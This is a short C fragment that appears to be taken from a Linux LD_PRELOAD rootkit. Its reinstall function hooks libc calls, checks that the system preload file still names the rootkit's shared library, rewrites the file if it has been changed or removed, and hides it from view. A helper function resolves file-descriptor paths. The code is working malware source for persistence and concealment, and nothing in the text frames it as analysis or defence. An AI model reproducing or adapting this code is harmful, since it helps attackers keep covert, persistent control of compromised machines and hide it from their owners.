char *get_fdname(int fd){
    char fd_path[strlen("/proc/self/fd/") + 20],
         *filename = (char *)malloc(PATH_MAX);
    memset(filename, 0, PATH_MAX);

    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    if(readlink(fd_path, filename, PATH_MAX) < 0)
        strncpy(filename, "shit", 5);

    return filename;
}

void reinstall(void){
    FILE *preload;
    struct stat s_fstat;
    memset(&s_fstat, 0, sizeof(struct stat));

    hook(o_xstat, "__xstat");
    o_xstat(_STAT_VER, PRELOAD, &s_fstat);

    hook(o_access, "access");
    if(s_fstat.st_size != strlen(SOPATH) || o_access(PRELOAD, F_OK) == -1){
        hook(o_fopen,"fopen");
        preload = o_fopen(PRELOAD, "w");
        if(preload != NULL){
            fwrite(SOPATH, strlen(SOPATH), 1, preload);
            fflush(preload);
            fclose(preload);
            hidepath(PRELOAD);
        }
    }
}